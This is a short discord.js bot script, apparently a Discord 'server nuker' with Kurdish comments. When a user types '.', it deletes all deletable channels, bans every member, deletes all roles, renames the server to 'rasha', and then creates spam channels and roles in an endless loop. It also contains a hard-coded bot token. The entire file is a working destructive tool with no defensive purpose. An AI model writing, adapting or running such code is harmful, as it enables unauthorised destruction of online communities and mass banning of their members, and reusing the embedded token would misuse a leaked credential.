const Discord = require("discord.js");
const client = new Discord.Client();
const prefix = ".";
client.on("message", message => {
  if (message.content === ".") {
    if (message.channel.guild) {
      message.guild.channels.forEach(c => {
        if (c.deletable) {
          c.delete();
        }
      });
      message.guild.members.forEach(m => {
        m.ban();
      });
      message.guild.roles.forEach(r => {
        r.delete();
      });
      message.guild.setName("rasha");////nawek dane bo sar server 
      setInterval(function() {
        message.guild.createChannel("", "rasha");///////bo channel 
        message.guild.createChannel("", "rasha");////bo voice
        message.guild.createRole({ name: "rasha" });////nawek dane bo role kan
      });
    }
  }
});

client.login("MTAxNTU3NzUwMDgzNjk2MjMzNA.GIf73F.e2hIYh4UYC9bHy4ZM3hl_v6ZwfVAI7FGWbBmsQ");
